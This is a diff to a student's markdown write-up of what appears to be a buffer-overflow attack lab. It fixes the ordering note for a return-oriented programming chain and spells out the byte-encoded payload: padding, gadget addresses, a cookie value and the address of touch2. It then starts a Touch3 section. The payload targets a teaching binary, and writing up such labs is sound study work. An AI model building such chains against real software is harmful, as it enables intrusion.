@@ -275,7 +275,7 @@ The lower address excutes first.
 
 Following %rsp + 64, %rsp + 72 ... must have instruction addresses that set %rdi to cookie.
 
-The last(lowest address) address of the chaine would be that of `touch2`.
+The last(highest address) address of the chaine would be that of `touch2`.
 
 [56 padding][address 1][address 2][address 3]...[address of touch2]
 
@@ -315,6 +315,9 @@ Let's encode it.
 
 [56 padding][401b3d][5788e9e7][401b4b][401987]
 
-[56 padding][3d 1b 40 00 00 00 00 00 in ascii][e7 e9 88 57 in ascii][87 19 40 in ascii]
+[56 padding][3d 1b 40 00 00 00 00 00 in ascii][e7 e9 88 57 00 00 00 00 in ascii][4b 1b 40 00 00 00 00 00 in ascii][87 19 40 00 00 00 00 00 in ascii]
 
 
+### Touch3
+
+in progress..
